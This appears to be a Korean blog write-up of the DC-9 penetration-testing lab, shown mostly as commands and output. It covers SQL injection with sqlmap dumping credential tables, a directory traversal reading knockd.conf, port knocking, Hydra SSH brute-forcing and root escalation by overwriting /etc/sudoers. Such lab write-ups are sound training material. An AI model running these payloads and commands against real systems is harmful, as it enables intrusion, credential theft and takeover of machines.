---
title: "DC-9 Writeup"
date: 2025-09-06T00:00:00+09:00
# weight: 1
# aliases: ["/first"]
tags: ["pen-testing", "hacking"]
author: "Me"
categories: ["Penetration Testing"]
# author: ["Me", "You"] # multiple authors

showToc: true
TocOpen: false
draft: false
hidemeta: false
comments: true
description: "Offsec PGP lab DC-9 Writeup"
# canonicalURL: "https://canonical.url/to/page"
disableHLJS: true # to disable highlightjs
disableShare: false
disableHLJS: false
hideSummary: false
searchHidden: false
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowWordCount: true
ShowRssButtonInSectionTermList: true
UseHugoToc: true
cover:
    image: "posts/cover/offsec.png" # image path/url
    alt: "cover-image"

editPost:
    URL: "https://github.com/hynseok/blog/blob/main/content"
    Text: "Suggest Changes" # edit text
    appendFilePath: true # to append file path to Edit link
---

## Enumeration
### Nmap
command
```shell
sudo nmap -p- -T4 target
```

result
```
Not shown: 65499 closed tcp ports (reset), 34 filtered tcp ports (no-response), 1 filtered tcp ports (port-unreach)
PORT   STATE SERVICE
80/tcp open  http
```
* 80번 포트만 열려있는 것을 확인할 수 있었습니다.

command
``` shell
sudo nmap -sV -sC -p 80 target
```

result
```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Example.com - Staff Details - Welcome
|_http-server-header: Apache/2.4.38 (Debian)
```
* 상세 버전 정보 조회 결과입니다.

### Gobuster
command
```
gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt -z
```

result
```
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 271]
/.htpasswd            (Status: 403) [Size: 271]
/.htaccess            (Status: 403) [Size: 271]
/css                  (Status: 301) [Size: 298] [--> http://target/css/]
/includes             (Status: 301) [Size: 303] [--> http://target/includes/]
/index.php            (Status: 200) [Size: 917]
/server-status        (Status: 403) [Size: 271]
===============================================================
Finished
===============================================================
```

## Exploitation

![dc9-img-1](images/dc9/dc9-1.png)
`index.php`로 접근하면 여러 메뉴를 볼 수 있는데, 그 중 유저를 검색하는 `search.php`에서 sql injection이 가능했습니다.

```sql
' OR 1=1 #
```
- 검색시 위 라인을 입력하면 모든 사용자가 검색 결과로 출력됩니다.

### sqlmap
- sqlmap은 웹 요청 입력값에 여러 sql문을 넣어 자동으로 sql injection 공격을 수행하는 도구입니다.

```
POST /results.php HTTP/1.1
Host: target
Content-Length: 9
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://target
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://target/search.php
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

search=name
```
- burp를 통해 요청 전문을 복사해서 `req` 파일로 저장합니다.

command
``` shell
sqlmap -r req --dbs --dump --batch 
```
* 데이터베이스 목록, 안의 내용을 dump 떠서 보여주고, `batch`옵션을 통해 sqlmap 과정 중 선택사항을 자동화합니다

result
```
[19:12:18] [INFO] starting dictionary-based cracking (md5_generic_passwd)
[19:12:18] [INFO] starting 6 processes 
[19:12:32] [WARNING] no clear password(s) found                                                        
Database: Staff
Table: Users
[1 entry]
+--------+----------------------------------+----------+
| UserID | Password                         | Username |
+--------+----------------------------------+----------+
| 1      | 856f5de590ef37314e7c3bdf6f8a66dc | admin    |
+--------+----------------------------------+----------+
...
```
- admin의 password가 md5 hash값으로 찾아졌습니다.

command
``` shell
sqlmap -r req --tables
```

result
```
Database: Staff
[2 tables]
+---------------------------------------+
| StaffDetails                          |
| Users                                 |
+---------------------------------------+

Database: users
[1 table]
+---------------------------------------+
| UserDetails                           |
+---------------------------------------+
```

command
``` shell
sqlmap -r req --dump -D users -T UserDetails --batch
```

result
```
+----+------------+---------------+---------------------+-----------+-----------+
| id | lastname   | password      | reg_date            | username  | firstname |
+----+------------+---------------+---------------------+-----------+-----------+
| 1  | Moe        | 3kfs86sfd     | 2019-12-29 16:58:26 | marym     | Mary      |
| 2  | Dooley     | 468sfdfsd2    | 2019-12-29 16:58:26 | julied    | Julie     |
| 3  | Flintstone | 4sfd87sfd1    | 2019-12-29 16:58:26 | fredf     | Fred      |
| 4  | Rubble     | RocksOff      | 2019-12-29 16:58:26 | barneyr   | Barney    |
| 5  | Cat        | TC&TheBoyz    | 2019-12-29 16:58:26 | tomc      | Tom       |
| 6  | Mouse      | B8m#48sd      | 2019-12-29 16:58:26 | jerrym    | Jerry     |
| 7  | Flintstone | Pebbles       | 2019-12-29 16:58:26 | wilmaf    | Wilma     |
| 8  | Rubble     | BamBam01      | 2019-12-29 16:58:26 | bettyr    | Betty     |
| 9  | Bing       | UrAG0D!       | 2019-12-29 16:58:26 | chandlerb | Chandler  |
| 10 | Tribbiani  | Passw0rd      | 2019-12-29 16:58:26 | joeyt     | Joey      |
| 11 | Green      | yN72#dsd      | 2019-12-29 16:58:26 | rachelg   | Rachel    |
| 12 | Geller     | ILoveRachel   | 2019-12-29 16:58:26 | rossg     | Ross      |
| 13 | Geller     | 3248dsds7s    | 2019-12-29 16:58:26 | monicag   | Monica    |
| 14 | Buffay     | smellycats    | 2019-12-29 16:58:26 | phoebeb   | Phoebe    |
| 15 | McScoots   | YR3BVxxxw87   | 2019-12-29 16:58:26 | scoots    | Scooter   |
| 16 | Trump      | Ilovepeepee   | 2019-12-29 16:58:26 | janitor   | Donald    |
| 17 | Morrison   | Hawaii-Five-0 | 2019-12-29 16:58:28 | janitor2  | Scott     |
+----+------------+---------------+---------------------+-----------+-----------+
```
- username 과 password를 후에 사용합니다. 
### hashes.com
![dc9-img2](images/dc9/dc9-2.png)
- hashes.com 에서 hash를 검색한 결과 `transorbital1`이 admin의 비밀번호임을 알 수 있었습니다.


### knockd and Hydra cracking
```
http://target/welcome.php?file=../../../../../../../etc/knockd.conf
```
- admin 권한 사이트에는 directory traversal 취약점이 있었고, knockd를 통해 ssh 포트를 열 수 있었습니다. 

```
[options] UseSyslog 
[openSSH] sequence = 7469,8475,9842 seq_timeout = 25 command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT tcpflags = syn 
[closeSSH] sequence = 9842,8475,7469 seq_timeout = 25 command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT tcpflags = syn 
```

``` shell
for i in 7469 8475 9842; do nmap -Pn --max-retries 0 -p $i target && sleep 1; done
```
- nmap을 통해 sequence에 맞는 포트로의 syn 요청을 보냅니다.

```
nmap -p 22 target    
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-06 19:48 KST
Nmap scan report for target (192.168.131.209)
Host is up (0.089s latency).

PORT   STATE SERVICE
22/tcp open  ssh

Nmap done: 1 IP address (1 host up) scanned in 0.36 seconds
```
- ssh 포트가 오픈된 것을 확인할 수 있습니다.

```shell
sqlmap -r req --dump -D users -T UserDetails -C username --batch
sqlmap -r req --dump -D users -T UserDetails -C password --batch
```
- password column과 username column을 출력해 복사하고, `username.txt`, `password.txt`로 저장합니다.

```shell
sed -i 's/|//g; s/ //g' username.txt
sed -i 's/|//g; s/ //g' password.txt
```

command
``` shell
hydra -L usernames.txt -P passwords.txt ssh://target
```

result
```shell            
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-06 20:20:25
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 324 login tries (l:18/p:18), ~21 tries per task
[DATA] attacking ssh://target:22/
[22][ssh] host: target   login: chandlerb   password: UrAG0D!
[22][ssh] host: target   login: joeyt   password: Passw0rd
[STATUS] 238.00 tries/min, 238 tries in 00:01h, 89 to do in 00:01h, 13 active
[22][ssh] host: target   login: janitor   password: Ilovepeepee
1 of 1 target successfully completed, 3 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-06 20:21:52
```

## Privilege Escalation

`janitor` 의 계정에서 추가적인 패스워드 정보를 확인할 수 있었습니다.
```shell
ls -al
total 16
drwx------  4 janitor janitor 4096 Sep  6 21:21 .
drwxr-xr-x 19 root    root    4096 Dec 29  2019 ..
lrwxrwxrwx  1 janitor janitor    9 Dec 29  2019 .bash_history -> /dev/null
drwx------  3 janitor janitor 4096 Sep  6 21:21 .gnupg
drwx------  2 janitor janitor 4096 Dec 29  2019 .secrets-for-putin
```

```shell
cat passwords-found-on-post-it-notes.txt 
BamBam01
Passw0rd
smellycats
P0Lic#10-4
B4-Tru3-001
4uGU5T-NiGHts
```
* 아래 세줄은 DB에서 얻은 password외에 새로운 password였습니다.
* hydra를 통해 다시 bruteforcing을 시도합니다.

```shell
[22][ssh] host: target   login: fredf   password: B4-Tru3-001
```
`fredf`유저에 대한 로그인 정보가 새롭게 cracking되었습니다.

```shell
sudo -l
Matching Defaults entries for fredf on dc-9:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User fredf may run the following commands on dc-9:
    (root) NOPASSWD: /opt/devstuff/dist/test/test
```
- `fredf` 유저는 /opt/devstuff/dist/test/test를 superuser 권한으로 실행할 수 있었습니다.


```python
#!/usr/bin/python

import sys

if len (sys.argv) != 3 :
    print ("Usage: python test.py read append")
    sys.exit (1)

else :
    f = open(sys.argv[1], "r")
    output = (f.read())

    f = open(sys.argv[2], "a")
    f.write(output)
    f.close()
```
- `/opt/devstuff/test.py`를 확인해보니 첫번째 argument로부터 파일을 읽어 두번째 argument 파일에 쓰는 프로그램이었습니다. 

```shell
echo 'fredf ALL=(root) NOPASSWD: ALL' > /tmp/a
sudo /opt/devstuff/dist/test/test /tmp/a /etc/sudoers
sudo su
```
- `/etc/sudoers`파일을 덮어써서 루트 권한을 획득합니다.
